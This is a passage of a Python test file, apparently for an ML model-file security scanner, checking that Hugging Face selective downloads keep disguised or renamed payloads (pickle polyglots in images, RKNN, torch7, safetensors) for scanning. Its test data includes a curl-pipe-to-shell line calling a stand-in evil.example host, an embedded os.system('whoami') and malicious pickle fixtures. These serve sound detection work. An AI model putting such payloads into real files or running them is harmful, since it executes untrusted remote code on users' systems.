                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n",
                "torch7",
            ),
            (b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n", "llamafile"),
            (_make_executable_zip_polyglot_payload(), "executable_zip_polyglot"),
        ],
        ids=[
            "safetensors",
            "protocol0-pickle",
            "delayed-protocolless-binary-pickle",
            "protocolless-binary-pickle-beyond-probe-budget",
            "tar",
            "cntk",
            "lightgbm",
            "pmml-xml",
            "jax-json",
            "mxnet",
            "executorch",
            "flax-msgpack",
            "flax-msgpack-delayed-root",
            "torch7",
            "llamafile",
            "executable-zip-polyglot",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_bounded_content_routed_payloads(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload: bytes,
        expected_format: str,
    ) -> None:
        """Selective downloads should preserve renamed payloads recognized by bounded probes."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "hidden.payload").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_extensionless_xgboost_ubjson(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Extensionless XGBoost UBJSON should survive remote and local routing."""
        payload = _make_xgboost_ubjson_payload()
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        xgboost_path = download_path / "model"
        xgboost_path.write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "model"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(xgboost_path)) == "xgboost"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_suffixed_xgboost_ubjson(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote routing should match the extensionless-only local XGBoost contract."""
        payload = _make_xgboost_ubjson_payload()
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @pytest.mark.parametrize("filename", ["checkpoint.py", "checkpoint.pyw"])
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_jax_json_source_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        filename: str,
        tmp_path: Path,
    ) -> None:
        """Remote JAX routing should preserve the local source-file exclusions."""
        payload = b'{"orbax_version":"1.0","framework":"jax"}'
        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["pytorch_model.bin", filename], _HF_TEST_REVISION, None),
        ):
            download_path = tmp_path / "download"
            download_path.mkdir()
            (download_path / "pytorch_model.bin").write_bytes(b"weights")
            mock_snapshot_download.return_value = str(download_path)
            mock_requests_get.return_value = _FakeRangeResponse(payload)

            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @pytest.mark.parametrize(
        "payload_factory, expected_format",
        [
            (_make_tensorflow_savedmodel_payload, "tf_savedmodel"),
            (_make_coreml_payload, "coreml"),
            (_make_onnx_payload, "onnx"),
        ],
        ids=["tensorflow-protobuf", "coreml-protobuf", "onnx-protobuf"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_bounded_content_routed_protobuf_payloads(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload_factory: Callable[[Path], bytes],
        expected_format: str,
    ) -> None:
        """Selective downloads should preserve renamed framework protobuf payloads."""
        payload = payload_factory(tmp_path)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "hidden.payload").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format

    @pytest.mark.parametrize(
        "payload",
        [
            struct.pack("<Q", 4) + b"\x00" * 8,
            struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * 7,
            b"\x0a\x07version\x0a\x03uid",
            (
                b"tree implementation notes\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
            ),
            b'<?xml version="1.0"?><project><PMML-not-root /></project>',
            b'{"framework":"ajax","payload":"not a JAX checkpoint"}',
            b"{" + _ubjson_key(b"learner") + b"{}" + _ubjson_key(b"metadata") + b"{}" + b"}",
            b'{"nodes":[{"op":"Custom"}],"arg_nodes":[],"heads":[[0,0,0]]}',
            b"\x0c\x00\x00\x00ETAA\x04\x00\x04\x00\x04\x00\x00\x00",
            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x00\x00\x00\x00",
            b"\x81\xa8metadata\xa4safe",
            b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
            b"\x12\x02\x08\x01",
            b"\x08\x08\x12\x02\x08\x01",
            b"\x08\x08\x3a\x02\x08\x01",
            b"\x06\xc1" + b"\x00" * ((1024 * 1024) + 32),
        ],
        ids=[
            "malformed-safetensors",
            "truncated-oversized-safetensors",
            "cntk-notes",
            "lightgbm-notes",
            "xml-notes",
            "ajax-json",
            "xgboost-ubjson-near-match",
            "mxnet-notes",
            "executorch-near-match",
            "executorch-invalid-flatbuffer",
            "flax-msgpack-near-match",
            "torch7-source-near-match",
            "llamafile-near-match",
            "tensorflow-protobuf-near-match",
            "coreml-protobuf-near-match",
            "onnx-protobuf-near-match",
            "large-invalid-msgpack-near-match",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_benign_content_route_near_matches(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload: bytes,
    ) -> None:
        """Bounded content probes should not pull benign near-match files into snapshots."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @pytest.mark.parametrize(
        ("response_headers", "response_status_code"),
        [
            ({"Content-Range": f"bytes 0-8191/{8 + 1 + (9 * 1024)}"}, 206),
            ({"Content-Length": str(8 + 1 + (9 * 1024))}, 200),
        ],
        ids=["partial-content-range", "full-content-length"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "metadata.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_uses_remote_size_to_reject_truncated_oversized_safetensors(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        response_headers: dict[str, str],
        response_status_code: int,
    ) -> None:
        """A disclosed short file must not satisfy an attacker-sized SafeTensors header."""
        payload = struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * (9 * 1024)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(
            payload,
            headers=response_headers,
            status_code=response_status_code,
        )

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "weights.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_disclosed_oversized_safetensors(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A plausible oversized header should remain scannable when it fits the remote file."""
        header_len = (16 * 1024 * 1024) + 1
        payload = struct.pack("<Q", header_len) + b"{" + b"\x00" * (9 * 1024)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        safetensors_path = download_path / "weights.payload"
        with safetensors_path.open("wb") as handle:
            handle.write(payload)
            handle.truncate(8 + header_len)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(
            payload,
            headers={"Content-Range": f"bytes 0-8191/{8 + header_len}"},
        )

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == [
            "pytorch_model.bin",
            "weights.payload",
        ]
        assert detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], _HF_TEST_REVISION, None),
    )
    @patch(
        "requests.get",
        side_effect=PermissionError(
            "denied https://cas-bridge.xethub.hf.co/object?X-Amz-Credential=secret&X-Amz-Signature=signed"
        ),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_when_skipped_file_cannot_be_inspected(
        self,
        mock_snapshot_download: MagicMock,
        _mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Skipped remote files must be inspectable before selective filtering excludes them."""
        with pytest.raises(Exception) as excinfo:
            download_model("https://huggingface.co/test/model")

        error = str(excinfo.value)
        assert "selective filtering incomplete" in error
        assert "evil.payload" in error
        assert "X-Amz-Credential" not in error
        assert "X-Amz-Signature" not in error
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_short_partial_response_without_content_range(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """A short 206 response cannot prove that a content probe reached EOF."""
        mock_requests_get.return_value = _FakeRangeResponse(
            b"\x81\xa6params\x81\xa1w\x91\x01",
            headers={},
            status_code=206,
        )

        with pytest.raises(Exception, match="selective filtering incomplete"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_short_partial_response_with_content_range(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """A short 206 response cannot claim a larger remote file and suppress routing."""
        mock_requests_get.return_value = _FakeRangeResponse(
            b"\x81\xa6params\x81\xa1w\x91\x01",
            headers={"Content-Range": "bytes 0-12/100000"},
            status_code=206,
        )

        with pytest.raises(Exception, match="selective filtering incomplete"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.exe"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_tflite_blocked_suffix_guard(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote TFLite probes should match local blocked-suffix false-positive guards."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.jpg"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_renamed_rknn_payload(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote selective filtering must retain renamed RKNN payloads for scanning."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        (download_path / "payload.jpg").write_bytes(b"RKNN\x01\x00\x00\x00description=os.system('whoami')\n")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"RKNN\x01\x00\x00\x00description=os.system('whoami')\n")

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.jpg"]
        assert detect_file_format_for_skip_filter(str(download_path / "payload.jpg")) == "rknn"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "preview.png", "preview.jpg"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_excludes_valid_media_from_content_routing(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.side_effect = [
            _FakeRangeResponse(valid_png_bytes()),
            _FakeRangeResponse(valid_jpeg_bytes()),
        ]

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_media_pickle_polyglot(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = valid_png_bytes() + malicious_pickle_bytes()
        (download_path / "payload.png").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.png"]
        assert detect_file_format_for_skip_filter(str(download_path / "payload.png")) == "pickle"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_media_pickle_polyglot_with_fake_png_iend(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = valid_png_bytes() + malicious_pickle_bytes() + valid_png_bytes()[-12:]
        (download_path / "payload.png").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.png"]
        assert detect_file_format_for_skip_filter(str(download_path / "payload.png")) == "pickle"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_padded_media_pickle_polyglot(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = valid_png_bytes() + malicious_pickle_bytes() + (b"\0" * (MEDIA_ROUTE_TAIL_READ_BYTES + 1))
        tail_start = len(payload) - MEDIA_ROUTE_TAIL_READ_BYTES
        (download_path / "payload.png").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.side_effect = [
            _FakeRangeResponse(payload[: 8 * 1024], headers={"Content-Length": str(len(payload))}),
            _fake_content_range_response(payload, tail_start, len(payload) - 1),
        ]

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.png"]
        assert detect_file_format_for_skip_filter(str(download_path / "payload.png")) == "pickle"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_bounds_large_media_tail_probe(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = _make_large_valid_png_payload()
        tail_start = len(payload) - MEDIA_ROUTE_TAIL_READ_BYTES
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.side_effect = [
            _FakeRangeResponse(payload[: 8 * 1024], headers={"Content-Length": str(len(payload))}),
            _fake_content_range_response(payload, tail_start, len(payload) - 1),
        ]

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]
        assert [request.kwargs["headers"]["Range"] for request in mock_requests_get.call_args_list] == [
            "bytes=0-8191",
            f"bytes={tail_start}-{len(payload) - 1}",
        ]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_forged_remote_png_tail(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = _make_forged_png_tail_payload()
        (download_path / "payload.png").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _fake_content_range_response(payload, 0, (8 * 1024) - 1)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.png"]
        assert detect_file_format_for_skip_filter(str(download_path / "payload.png")) in {
            "pickle",
            PICKLE_ROUTING_INCONCLUSIVE_FORMAT,
        }

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_remote_png_with_invalid_crc(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = _make_invalid_png_crc_payload()
        (download_path / "payload.png").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.png"]
        assert (
            detect_file_format_for_skip_filter(str(download_path / "payload.png")) == PICKLE_ROUTING_INCONCLUSIVE_FORMAT
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.jpg"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_forged_remote_jpeg_tail(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = _make_forged_jpeg_tail_payload()
        tail_start = len(payload) - MEDIA_ROUTE_TAIL_READ_BYTES
        (download_path / "payload.jpg").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.side_effect = [
            _FakeRangeResponse(payload[: 8 * 1024], headers={"Content-Length": str(len(payload))}),
            _fake_content_range_response(payload, tail_start, len(payload) - 1),
        ]

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.jpg"]
        assert (
            detect_file_format_for_skip_filter(str(download_path / "payload.jpg")) == PICKLE_ROUTING_INCONCLUSIVE_FORMAT
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "preview.jpg"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_excludes_large_remote_jpeg_with_bounded_structural_proof(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        payload = _make_large_valid_jpeg_payload()
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.side_effect = _fake_range_responder(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.pb"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_rknn_blocked_suffix_guard(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote RKNN probes should match local renamed-binary suffix guards."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"RKNN\x01\x00\x00\x00payload")

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @pytest.mark.parametrize(
        ("filename", "payload"),
        [
            ("graph.pb", b"T7\x00\x00" + b"\x00" * 16),
            ("weights.model", b"B\x00C\x00N\x00\x00\x00" + b"\x00" * 16),
        ],
        ids=["torch7", "cntk"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_magic_route_suffix_guards(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        filename: str,
        payload: bytes,
        tmp_path: Path,
    ) -> None:
        """Remote magic probes must preserve local filename-dependent false-positive guards."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["model.safetensors", filename], _HF_TEST_REVISION, None),
        ):
            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @pytest.mark.parametrize("blocked_suffix", [".bin", ".meta", ".pb"])
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
